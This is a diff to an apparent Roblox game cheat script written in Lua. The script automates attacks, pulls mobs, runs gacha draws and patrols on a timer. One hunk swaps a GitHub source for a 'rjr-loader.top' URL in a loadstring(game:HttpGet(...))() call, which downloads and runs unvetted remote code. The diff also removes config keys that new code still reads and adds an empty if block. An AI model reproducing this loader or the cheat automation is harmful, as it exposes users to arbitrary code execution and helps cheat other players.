@@ -16,6 +16,7 @@ local GachaNetworkRF = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("N
 local LocalPlayer = Players.LocalPlayer
 local player = Players.LocalPlayer
 local LocalPlayer = player
+local player = LocalPlayer
 
 -- Fast Attack Remote
 local Net = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net")
@@ -284,7 +285,7 @@ end
 
 local ScriptLoadstring = [[if isfile("AutoEvent.file") then
     if readfile("AutoEvent.file") == "true" then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/xuez1025/Open-soucre/refs/heads/main/Auto%20Event"))()
+        loadstring(game:HttpGet("https://rjr-loader.top/script/autoevent"))()
     end
 end]]
 
@@ -307,9 +308,6 @@ local ConfigDirty = false
 
 local ConfigKeys = {
 		"BringMob",
-    "HourlyAutoPatrol",
-    "AutoEquip_SelectedType",
-    "FruitFlySpeed",
 		"AutoGachaEnabled",
     "SelectTeam",
     "FastAttack",
@@ -851,7 +849,7 @@ end
 ProcessNextLocation = function()
     if not _isAutoChecking or _isTargeting then return end
     if #unvisitedLocations == 0 then
-        SendNotify("巡邏完畢", "已歷遍所有座標，未發現 MagnetModeProxy，等待下個整點", 5)
+        SendNotify("巡邏完畢", "已歷遍所有座標，未發現 MagnetModeProxy", 5)
         _isAutoChecking = false
         _isTargeting = false
         return
@@ -911,19 +909,29 @@ local function StopPatrol()
     globalStopTween()
 end
 
+-- 整點 ~ 整點後 10 分鐘的時間監控邏輯
 task.spawn(function()
     while task.wait(1) do
         if _G.HourlyAutoPatrol then
             local t = os.date("*t")
-            if t.min == 0 and t.sec == 0 then
-                if not _isAutoChecking then
+            -- 判斷是否在每小時的 00 分 00 秒 ~ 10 分 00 秒 範圍內
+            local isInPatrolWindow = (t.min < 10) or (t.min == 10 and t.sec == 0)
+
+            if isInPatrolWindow then
+                if not _isAutoChecking and not _isTargeting then
                     StartPatrol()
+                end
+            else
+                if _isAutoChecking or _isTargeting then
+                    StopPatrol()
+                    SendNotify("巡邏時間結束", "已超過整點後 10 分鐘，自動停止巡邏", 3)
                 end
             end
         end
     end
 end)
 
+-- 防呆/模擬網絡控制
 task.spawn(function()
     while task.wait(5) do
         if _G.BringMob then
@@ -936,6 +944,7 @@ task.spawn(function()
     end
 end)
 
+-- 吸怪/聚怪邏輯
 local LastBring = 0
 task.spawn(function()
     while task.wait(0.1) do
@@ -1008,6 +1017,15 @@ task.spawn(function()
         end
     end
 end)
+
+if _G.HourlyAutoPatrol then
+    _G.AutoEquip_SelectedType = "Melee"
+    equipByType("Melee")
+
+end
+
+if _G.BringMob then
+end
 
 -- 自動抽果
 task.spawn(function()
